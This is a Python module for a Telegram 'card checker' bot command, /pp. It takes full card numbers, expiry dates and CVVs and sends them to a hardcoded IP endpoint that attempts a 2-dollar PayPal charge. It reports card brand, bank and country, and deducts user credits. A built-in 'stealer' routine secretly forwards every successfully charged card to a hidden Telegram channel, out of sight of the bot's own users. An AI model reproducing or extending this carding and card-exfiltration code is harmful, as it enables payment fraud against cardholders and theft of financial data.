import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved
# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953
async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")
@Client.on_message(filters.command("pp", [".", "/"]))
async def paypal_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        gateway = "PayPal 2$ charge"
        if checkall[0] == False:
            return
        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /pp

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /pp cc|mes|ano|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True)
            return
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        endpoint_url = f"http://138.128.240.15:8025/paypal_donate?cc={fullcc}"
        
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, quote=True)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
        
        start = time.perf_counter()
        
        async def call_api():
            async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
                for attempt in range(2):
                    try:
                        response_obj = await session.get(endpoint_url)
                        result_json = response_obj.json()
                        api_status = result_json.get("status", "Unknown").lower()
                        response_msg = result_json.get("message", "No response message")
                        
                        if "approved" in api_status:
                            return "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥", response_msg
                        elif "declined" in api_status or "failed" in api_status:
                            return "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌", response_msg
                        else:
                            return api_status.upper(), response_msg
                    except:
                        if attempt == 1:
                            return "Error", "Request failed"
                        await asyncio.sleep(1)
            return "Error", "Request failed"
        
        status, response = await call_api()
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        finalresp = f"""
[玄] 𝘾𝘾 -» <code>{fullcc}</code>
[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}
[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
[玄] 𝘽𝙖𝙣𝙠 -» {bank}
[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
            await send_hit_if_approved(Client, finalresp)
        
    except Exception:
        import traceback
        await error_log(traceback.format_exc())
